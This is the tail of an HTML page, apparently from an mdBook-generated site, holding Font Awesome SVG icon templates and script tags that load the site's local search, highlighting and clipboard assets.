        <template id=fa-play><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M73 39c-14.8-9.1-33.4-9.4-48.5-.9S0 62.6 0 80V432c0 17.4 9.4 33.4 24.5 41.9s33.7 8.1 48.5-.9L361 297c14.3-8.7 23-24.2 23-41s-8.7-32.2-23-41L73 39z"/></svg></span></template>
        <template id=fa-clock-rotate-left><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M75 75L41 41C25.9 25.9 0 36.6 0 57.9V168c0 13.3 10.7 24 24 24H134.1c21.4 0 32.1-25.9 17-41l-30.8-30.8C155 85.5 203 64 256 64c106 0 192 86 192 192s-86 192-192 192c-40.8 0-78.6-12.7-109.7-34.4c-14.5-10.1-34.4-6.6-44.6 7.9s-6.6 34.4 7.9 44.6C151.2 495 201.7 512 256 512c141.4 0 256-114.6 256-256S397.4 0 256 0C185.3 0 121.3 28.7 75 75zm181 53c-13.3 0-24 10.7-24 24V256c0 6.4 2.5 12.5 7 17l72 72c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-65-65V152c0-13.3-10.7-24-24-24z"/></svg></span></template>



        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr-ef4e11c1.min.js"></script>
        <script src="../mark-09e88c2c.min.js"></script>
        <script src="../searcher-c2a407aa.js"></script>

        <script src="../clipboard-1626706a.min.js"></script>
        <script src="../highlight-abc7f01d.js"></script>
        <script src="../book-a0b12cfe.js"></script>

        <!-- Custom JS scripts -->



    </div>
    </body>
</html>
